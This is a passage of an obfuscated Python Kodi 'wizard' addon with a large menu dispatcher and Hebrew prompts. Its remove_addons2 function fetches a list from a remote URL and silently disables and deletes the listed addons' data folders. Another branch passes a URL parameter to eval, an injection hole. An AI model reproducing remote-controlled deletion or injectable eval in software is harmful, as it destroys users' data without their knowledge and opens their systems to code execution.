			xbmc .executebuiltin ('Container.Refresh')#line:5911
			xbmc .executebuiltin ("UpdateLocalAddons()")#line:5912
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5913
	except :pass #line:5914
def remove_addons2 ():#line:5915
	try :#line:5916
			import json #line:5917
			O0O0OOO0O00O00000 =urlopen (remove_url2 ).readlines ()#line:5918
			for O0OO0000OO00OOO00 in O0O0OOO0O00O00000 :#line:5919
				O00OO0OOOO0OO0OO0 =O0OO0000OO00OOO00 .split (':')[1 ].strip ()#line:5921
				OOO0O00O0O000O0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O00OO0OOOO0OO0OO0 ,'false')#line:5922
				OOOOO0O0O00000OOO =xbmc .executeJSONRPC (OOO0O00O0O000O0O0 )#line:5923
				O00O0O0O0OOO00OO0 =json .loads (OOOOO0O0O00000OOO )#line:5924
				O00O0OOO0OO000O00 =os .path .join (user_folder ,O00OO0OOOO0OO0OO0 )#line:5926
				if os .path .exists (O00O0OOO0OO000O00 ):#line:5928
					for O0O000O0O00O0OO00 ,O0O0OOO00O000OO00 ,OOO0OO0O0OOO000OO in os .walk (O00O0OOO0OO000O00 ):#line:5929
						for O0O0OO0O0000000O0 in OOO0OO0O0OOO000OO :#line:5930
							os .unlink (os .path .join (O0O000O0O00O0OO00 ,O0O0OO0O0000000O0 ))#line:5931
						for OO00OOO0OOO00OO00 in O0O0OOO00O000OO00 :#line:5932
							shutil .rmtree (os .path .join (O0O000O0O00O0OO00 ,OO00OOO0OOO00OO00 ))#line:5933
					os .rmdir (O00O0OOO0OO000O00 )#line:5934
	except :pass #line:5936
def setView (O00OOOO0000O0OOO0 ,OO0OOOOO0O00OOO00 ):#line:5950
    if wiz .getS ('auto-view')=='true':#line:5951
        O000OOO0OO0OOOO00 =wiz .getS (OO0OOOOO0O00OOO00 )#line:5952
        if O000OOO0OO0OOOO00 =='50'and KODIV >=17 and SKIN =='skin.estuary':O000OOO0OO0OOOO00 ='55'#line:5953
        if O000OOO0OO0OOOO00 =='500'and KODIV >=17 and SKIN =='skin.estuary':O000OOO0OO0OOOO00 ='50'#line:5954
        wiz .ebi ("Container.SetViewMode(%s)"%O000OOO0OO0OOOO00 )#line:5955
def refresh_list (OO00O000OOOOOO0O0 ,O0000OO0OO00OO000 ,Addon_id =""):#line:5956
    global name #line:5957
    if KODI_VERSION >18 :#line:5958
        O00O0O00O000000O0 =get_params (user_params =OO00O000OOOOOO0O0 )#line:5959
    else :#line:5960
        O00O0O00O000000O0 =get_params17_18 ()#line:5961
    O0O00OOO00O0O0000 =None #line:5962
    name =None #line:5963
    OO0OO00O0OOO000O0 =None #line:5964
    try :OO0OO00O0OOO000O0 =unque (O00O0O00O000000O0 ["mode"])#line:5966
    except :pass #line:5967
    try :name =unque (O00O0O00O000000O0 ["name"])#line:5968
    except :pass #line:5969
    try :O0O00OOO00O0O0000 =unque (O00O0O00O000000O0 ["url"])#line:5970
    except :pass #line:5971
    if OO0OO00O0OOO000O0 ==None :index ()#line:5972
    elif OO0OO00O0OOO000O0 =='user_info':wiz .user_info ()#line:5973
    elif OO0OO00O0OOO000O0 =='wizardupdate':wiz .wizardUpdate ()#line:5974
    elif OO0OO00O0OOO000O0 =='builds':buildMenu ()#line:5975
    elif OO0OO00O0OOO000O0 =='viewbuild':viewBuild (name )#line:5976
    elif OO0OO00O0OOO000O0 =='buildinfo':buildInfo (name )#line:5977
    elif OO0OO00O0OOO000O0 =='buildpreview':buildVideo (name )#line:5978
    elif OO0OO00O0OOO000O0 =='install':buildWizard (name ,O0O00OOO00O0O0000 )#line:5979
    elif OO0OO00O0OOO000O0 =='theme':buildWizard (name ,OO0OO00O0OOO000O0 ,O0O00OOO00O0O0000 )#line:5980
    elif OO0OO00O0OOO000O0 =='editthird':editThirdParty (name );wiz .refresh ()#line:5982
    elif OO0OO00O0OOO000O0 =='maint':maintMenu (name )#line:5984
    elif OO0OO00O0OOO000O0 =='passpin':passandpin ()#line:5985
    elif OO0OO00O0OOO000O0 =='backmyupbuild':backmyupbuild ()#line:5986
    elif OO0OO00O0OOO000O0 =='kodi17fix':wiz .kodi17Fix ()#line:5987
    elif OO0OO00O0OOO000O0 =='kodi177fix':wiz .kodi177Fix ()#line:5988
    elif OO0OO00O0OOO000O0 =='advancedsetting':advancedWindow (name )#line:5989
    elif OO0OO00O0OOO000O0 =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5990
    elif OO0OO00O0OOO000O0 =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5991
    elif OO0OO00O0OOO000O0 =='asciicheck':wiz .asciiCheck ()#line:5992
    elif OO0OO00O0OOO000O0 =='backupbuild':wiz .backUpOptions ('build')#line:5993
    elif OO0OO00O0OOO000O0 =='backupgui':wiz .backUpOptions ('guifix')#line:5994
    elif OO0OO00O0OOO000O0 =='backuptheme':wiz .backUpOptions ('theme')#line:5995
    elif OO0OO00O0OOO000O0 =='backupaddon':wiz .backUpOptions ('addondata')#line:5996
    elif OO0OO00O0OOO000O0 =='oldThumbs':wiz .oldThumbs ()#line:5997
    elif OO0OO00O0OOO000O0 =='clearbackup':wiz .cleanupBackup ()#line:5998
    elif OO0OO00O0OOO000O0 =='convertpath':wiz .convertSpecial (HOME )#line:5999
    elif OO0OO00O0OOO000O0 =='currentsettings':viewAdvanced ()#line:6000
    elif OO0OO00O0OOO000O0 =='fullclean':totalClean ();wiz .refresh ()#line:6001
    elif OO0OO00O0OOO000O0 =='clearcache':clearCache ();wiz .refresh ()#line:6002
    elif OO0OO00O0OOO000O0 =='fixwizard':fixwizard ();wiz .refresh ()#line:6003
    elif OO0OO00O0OOO000O0 =='fixskin':backtokodi ()#line:6004
    elif OO0OO00O0OOO000O0 =='testcommand':testcommand ()#line:6005
    elif OO0OO00O0OOO000O0 =='logsend':logsend ()#line:6006
    elif OO0OO00O0OOO000O0 =='rdon':rdon ()#line:6007
    elif OO0OO00O0OOO000O0 =='rdoff':rdoff ()#line:6008
    elif OO0OO00O0OOO000O0 =='setrd':setrealdebrid ()#line:6009
    elif OO0OO00O0OOO000O0 =='setrd2':setautorealdebrid ()#line:6010
    elif OO0OO00O0OOO000O0 =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6011
    elif OO0OO00O0OOO000O0 =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6012
    elif OO0OO00O0OOO000O0 =='clearthumb':clearThumb ();wiz .refresh ()#line:6013
    elif OO0OO00O0OOO000O0 =='checksources':wiz .checkSources ();wiz .refresh ()#line:6014
    elif OO0OO00O0OOO000O0 =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6015
    elif OO0OO00O0OOO000O0 =='freshstart':freshStart ()#line:6016
    elif OO0OO00O0OOO000O0 =='forceupdate':wiz .forceUpdate ()#line:6017
    elif OO0OO00O0OOO000O0 =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6018
    elif OO0OO00O0OOO000O0 =='forceclose':wiz .killxbmc ()#line:6019
    elif OO0OO00O0OOO000O0 =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6020
    elif OO0OO00O0OOO000O0 =='hidepassword':wiz .hidePassword ()#line:6021
    elif OO0OO00O0OOO000O0 =='unhidepassword':wiz .unhidePassword ()#line:6022
    elif OO0OO00O0OOO000O0 =='enableaddons':enableAddons ()#line:6023
    elif OO0OO00O0OOO000O0 =='toggleaddon':wiz .toggleAddon (name ,O0O00OOO00O0O0000 );wiz .refresh ()#line:6024
    elif OO0OO00O0OOO000O0 =='togglecache':toggleCache (name );wiz .refresh ()#line:6025
    elif OO0OO00O0OOO000O0 =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6026
    elif OO0OO00O0OOO000O0 =='changefeq':changeFeq ();wiz .refresh ()#line:6027
    elif OO0OO00O0OOO000O0 =='uploadlog':uploadLog .Main ()#line:6028
    elif OO0OO00O0OOO000O0 =='viewlog':LogViewer ()#line:6029
    elif OO0OO00O0OOO000O0 =='viewwizlog':LogViewer (WIZLOG )#line:6030
    elif OO0OO00O0OOO000O0 =='viewerrorlog':errorChecking (all =True )#line:6031
    elif OO0OO00O0OOO000O0 =='clearwizlog':OO00OO0OO0O0000OO =open (WIZLOG ,'w');OO00OO0OO0O0000OO .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6032
    elif OO0OO00O0OOO000O0 =='purgedb':purgeDb ()#line:6033
    elif OO0OO00O0OOO000O0 =='fixaddonupdate':fixUpdate ()#line:6034
    elif OO0OO00O0OOO000O0 =='removeaddons':removeAddonMenu ()#line:6035
    elif OO0OO00O0OOO000O0 =='removeaddon':removeAddon (name )#line:6036
    elif OO0OO00O0OOO000O0 =='removeaddondata':removeAddonDataMenu ()#line:6037
    elif OO0OO00O0OOO000O0 =='removedata':removeAddonData (name )#line:6038
    elif OO0OO00O0OOO000O0 =='resetaddon':O00O0O0O00OO0OOOO =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6039
    elif OO0OO00O0OOO000O0 =='systeminfo':systemInfo ()#line:6040
    elif OO0OO00O0OOO000O0 =='restorezip':restoreit ('build')#line:6041
    elif OO0OO00O0OOO000O0 =='restoregui':restoreit ('gui')#line:6042
    elif OO0OO00O0OOO000O0 =='restoreaddon':restoreit ('addondata')#line:6043
    elif OO0OO00O0OOO000O0 =='restoreextzip':restoreextit ('build')#line:6044
    elif OO0OO00O0OOO000O0 =='restoreextgui':restoreextit ('gui')#line:6045
    elif OO0OO00O0OOO000O0 =='restoreextaddon':restoreextit ('addondata')#line:6046
    elif OO0OO00O0OOO000O0 =='writeadvanced':writeAdvanced (name ,O0O00OOO00O0O0000 )#line:6047
    elif OO0OO00O0OOO000O0 =='traktsync':traktsync ()#line:6048
    elif OO0OO00O0OOO000O0 =='apk':apkMenu (name )#line:6050
    elif OO0OO00O0OOO000O0 =='apkscrape':apkScraper (name )#line:6051
    elif OO0OO00O0OOO000O0 =='apkinstall':apkInstaller (name ,O0O00OOO00O0O0000 )#line:6052
    elif OO0OO00O0OOO000O0 =='speed':speedMenu ()#line:6053
    elif OO0OO00O0OOO000O0 =='net':net_tools ()#line:6054
    elif OO0OO00O0OOO000O0 =='GetList':GetList (O0O00OOO00O0O0000 )#line:6055
    elif OO0OO00O0OOO000O0 =='viewVideo':playVideo (O0O00OOO00O0O0000 )#line:6056
    elif OO0OO00O0OOO000O0 =='addons':addonMenu (name )#line:6058
    elif OO0OO00O0OOO000O0 =='addoninstall':addonInstaller (name ,O0O00OOO00O0O0000 )#line:6059
    elif OO0OO00O0OOO000O0 =='savedata':saveMenu ()#line:6061
    elif OO0OO00O0OOO000O0 =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6062
    elif OO0OO00O0OOO000O0 =='whitelist':wiz .whiteList (name )#line:6064
    elif OO0OO00O0OOO000O0 =='trakt':traktMenu ()#line:6066
    elif OO0OO00O0OOO000O0 =='savetrakt':traktit .traktIt ('update',name )#line:6067
    elif OO0OO00O0OOO000O0 =='restoretrakt':traktit .traktIt ('restore',name )#line:6068
    elif OO0OO00O0OOO000O0 =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6069
    elif OO0OO00O0OOO000O0 =='cleartrakt':traktit .clearSaved (name )#line:6070
    elif OO0OO00O0OOO000O0 =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6071
    elif OO0OO00O0OOO000O0 =='updatetrakt':traktit .autoUpdate ('all')#line:6072
    elif OO0OO00O0OOO000O0 =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6073
    elif OO0OO00O0OOO000O0 =='realdebrid':realMenu ()#line:6075
    elif OO0OO00O0OOO000O0 =='savedebrid':debridit .debridIt ('update',name )#line:6076
    elif OO0OO00O0OOO000O0 =='restoredebrid':debridit .debridIt ('restore',name )#line:6077
    elif OO0OO00O0OOO000O0 =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6078
    elif OO0OO00O0OOO000O0 =='cleardebrid':debridit .clearSaved (name )#line:6079
    elif OO0OO00O0OOO000O0 =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6080
    elif OO0OO00O0OOO000O0 =='updatedebrid':debridit .autoUpdate ('all')#line:6081
    elif OO0OO00O0OOO000O0 =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6082
    elif OO0OO00O0OOO000O0 =='login':loginMenu ()#line:6084
    elif OO0OO00O0OOO000O0 =='savelogin':loginit .loginIt ('update',name )#line:6085
    elif OO0OO00O0OOO000O0 =='restorelogin':loginit .loginIt ('restore',name )#line:6086
    elif OO0OO00O0OOO000O0 =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6087
    elif OO0OO00O0OOO000O0 =='clearlogin':loginit .clearSaved (name )#line:6088
    elif OO0OO00O0OOO000O0 =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6089
    elif OO0OO00O0OOO000O0 =='updatelogin':loginit .autoUpdate ('all')#line:6090
    elif OO0OO00O0OOO000O0 =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6091
    elif OO0OO00O0OOO000O0 =='contact':notify .contact (CONTACT )#line:6093
    elif OO0OO00O0OOO000O0 =='settings':wiz .openS (name );wiz .refresh ()#line:6094
    elif OO0OO00O0OOO000O0 =='opensettings':OO00O00O0000OO0OO =eval (O0O00OOO00O0O0000 .upper ()+'ID')[name ]['plugin'];O0000000O0O000O0O =wiz .addonId (OO00O00O0000OO0OO );O0000000O0O000O0O .openSettings ();wiz .refresh ()#line:6095
    elif OO0OO00O0OOO000O0 =='developer':developer ()#line:6097
    elif OO0OO00O0OOO000O0 =='converttext':wiz .convertText ()#line:6098
    elif OO0OO00O0OOO000O0 =='createqr':wiz .createQR ()#line:6099
    elif OO0OO00O0OOO000O0 =='testnotify':testnotify ()#line:6100
    elif OO0OO00O0OOO000O0 =='testnotify2':testnotify2 ()#line:6101
    elif OO0OO00O0OOO000O0 =='servicemanual':servicemanual ()#line:6102
    elif OO0OO00O0OOO000O0 =='fastinstall':fastinstall ()#line:6103
    elif OO0OO00O0OOO000O0 =='testupdate':testupdate ()#line:6104
    elif OO0OO00O0OOO000O0 =='testfirst':testfirst ()#line:6105
    elif OO0OO00O0OOO000O0 =='testfirstrun':testfirstRun ()#line:6106
    elif OO0OO00O0OOO000O0 =='testapk':notify .apkInstaller ('SPMC')#line:6107
    elif OO0OO00O0OOO000O0 =='bg':wiz .bg_install (name ,O0O00OOO00O0O0000 )#line:6109
    elif OO0OO00O0OOO000O0 =='bgcustom':wiz .bg_custom ()#line:6110
    elif OO0OO00O0OOO000O0 =='bgremove':wiz .bg_remove ()#line:6111
    elif OO0OO00O0OOO000O0 =='bgdefault':wiz .bg_default ()#line:6112
    elif OO0OO00O0OOO000O0 =='rdset':rdsetup ()#line:6113
    elif OO0OO00O0OOO000O0 =='mor':morsetup ()#line:6114
    elif OO0OO00O0OOO000O0 =='mor2':morsetup2 ()#line:6115
    elif OO0OO00O0OOO000O0 =='firstinstall':firstinstall ()#line:6116
    elif OO0OO00O0OOO000O0 =='resolveurl':resolveurlsetup ()#line:6117
    elif OO0OO00O0OOO000O0 =='urlresolver':urlresolversetup ()#line:6118
    elif OO0OO00O0OOO000O0 =='forcefastupdate':forcefastupdate ()#line:6119
    elif OO0OO00O0OOO000O0 =='traktset':traktsetup ()#line:6120
    elif OO0OO00O0OOO000O0 =='placentaset':placentasetup ()#line:6121
    elif OO0OO00O0OOO000O0 =='flixnetset':flixnetsetup ()#line:6122
    elif OO0OO00O0OOO000O0 =='reptiliaset':reptiliasetup ()#line:6123
    elif OO0OO00O0OOO000O0 =='yodasset':yodasetup ()#line:6124
    elif OO0OO00O0OOO000O0 =='numbersset':numberssetup ()#line:6125
    elif OO0OO00O0OOO000O0 =='uranusset':uranussetup ()#line:6126
    elif OO0OO00O0OOO000O0 =='genesisset':genesissetup ()#line:6127
    elif OO0OO00O0OOO000O0 =='fastupdate':fastupdate ()#line:6128
    elif OO0OO00O0OOO000O0 =='folderback':folderback ()#line:6129
    elif OO0OO00O0OOO000O0 =='menudata':Menu ()#line:6130
    elif OO0OO00O0OOO000O0 =='infoupdate':infobuild ()#line:6131
    elif OO0OO00O0OOO000O0 =='wait':wait ()#line:6132
    elif OO0OO00O0OOO000O0 ==2 :#line:6133
            wiz .torent_menu ()#line:6134
    elif OO0OO00O0OOO000O0 ==3 :#line:6135
            wiz .popcorn_menu ()#line:6136
    elif OO0OO00O0OOO000O0 ==8 :#line:6137
            wiz .metaliq_fix ()#line:6138
    elif OO0OO00O0OOO000O0 ==9 :#line:6139
            wiz .quasar_menu ()#line:6140
    elif OO0OO00O0OOO000O0 ==5 :#line:6141
            swapSkins ('skin.Premium.mod')#line:6142
    elif OO0OO00O0OOO000O0 ==13 :#line:6143
            wiz .elementum_menu ()#line:6144
    elif OO0OO00O0OOO000O0 ==16 :#line:6145
            wiz .fix_wizard ()#line:6146
    elif OO0OO00O0OOO000O0 ==17 :#line:6147
            wiz .last_play ()#line:6148
    elif OO0OO00O0OOO000O0 ==18 :#line:6149
            wiz .normal_metalliq ()#line:6150
    elif OO0OO00O0OOO000O0 ==19 :#line:6151
            wiz .fast_metalliq ()#line:6152
    elif OO0OO00O0OOO000O0 ==20 :#line:6153
            wiz .fix_buffer2 ()#line:6154
    elif OO0OO00O0OOO000O0 ==21 :#line:6155
            wiz .fix_buffer3 ()#line:6156
    elif OO0OO00O0OOO000O0 ==11 :#line:6157
            wiz .fix_buffer ()#line:6158
    elif OO0OO00O0OOO000O0 ==15 :#line:6159
            wiz .fix_font ()#line:6160
    elif OO0OO00O0OOO000O0 ==14 :#line:6161
            wiz .clean_pass ()#line:6162
    elif OO0OO00O0OOO000O0 ==22 :#line:6163
            wiz .movie_update ()#line:6164
    elif OO0OO00O0OOO000O0 =='simpleiptv':#line:6167
        OOOO0O000O000O00O =xbmcgui .Dialog ()#line:6169
        OO0O00000OOO00000 =OOOO0O000O000O00O .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6170
        if OO0O00000OOO00000 ==1 :#line:6171
            iptvkodi17_18 ()#line:6172
        else :#line:6174
         sys .exit ()#line:6175
    elif OO0OO00O0OOO000O0 =='sex_menu_open':sex_menu_open ()#line:6178
    elif OO0OO00O0OOO000O0 =='sex_menu_luck':sex_menu_luck (notify ='true')#line:6179
    elif OO0OO00O0OOO000O0 =='tv_widget_tele':tv_widget_tele (notify ='true')#line:6180
    elif OO0OO00O0OOO000O0 =='tv_widget_mando':tv_widget_mando (notify ='true')#line:6181
    elif OO0OO00O0OOO000O0 =='open_turkey':open_turkey ()#line:6182
    elif OO0OO00O0OOO000O0 =='force_update':force_update ()#line:6183
    elif OO0OO00O0OOO000O0 =='update_tele':auto_build_update (NOTEID )#line:6184
    elif OO0OO00O0OOO000O0 =='update_movie':auto_movie_update (NOTEID3 )#line:6185
    elif OO0OO00O0OOO000O0 =='adv_settings':auto_buffer ()#line:6186
    elif OO0OO00O0OOO000O0 =='adv_settings_fromskin':auto_buffer_fromskin ()#line:6187
    elif OO0OO00O0OOO000O0 =='cleanbuffer':clean_buffer ()#line:6188
    elif OO0OO00O0OOO000O0 =='getpass':getpass ()#line:6189
    elif OO0OO00O0OOO000O0 =='setpass':setpass ()#line:6190
    elif OO0OO00O0OOO000O0 =='setuname':setuname ()#line:6191
    elif OO0OO00O0OOO000O0 =='check_firebase':check_firebase ()#line:6192
    elif OO0OO00O0OOO000O0 =='passandUsername':passandUsername ()#line:6194
    elif OO0OO00O0OOO000O0 =='9':disply_hwr ()#line:6195
    elif OO0OO00O0OOO000O0 =='99':disply_hwr2 ()#line:6196
    elif OO0OO00O0OOO000O0 =='80':send_hwr ()#line:6197
    elif OO0OO00O0OOO000O0 =='linux':linux_pack ()#line:6198
    elif OO0OO00O0OOO000O0 =='telemedia5':telemedia5 ()#line:6199
    xbmcplugin .endOfDirectory (int (sys .argv [1 ]))